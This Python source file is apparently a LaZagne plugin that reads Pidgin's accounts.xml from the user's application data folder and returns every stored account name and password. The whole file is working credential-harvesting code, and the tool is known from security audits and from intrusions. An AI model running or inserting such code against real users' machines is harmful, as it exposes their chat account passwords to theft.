# -*- coding: utf-8 -*- 
from lazagne.config.moduleInfo import ModuleInfo
from lazagne.config.constant import *
import xml.etree.cElementTree as ET
import os

class Pidgin(ModuleInfo):
	def __init__(self):
		ModuleInfo.__init__(self, 'pidgin', 'chats')

	def run(self, software_name = None):		
		path = os.path.join(constant.profile['APPDATA'], u'.purple', u'accounts.xml')
		if os.path.exists(path):
			if os.path.exists(path):
				tree 		= ET.ElementTree(file=path)
				root 		= tree.getroot()
				pwdFound 	= []

				for account in root.findall('account'):
					if account.find('name') is not None:
						name 		= account.find('name')
						password 	= account.find('password')

						if name is not None and password is not None:
							pwdFound.append(
												{
													'Login'		: name.text, 
													'Password'	: password.text
												}
											)
				return pwdFound
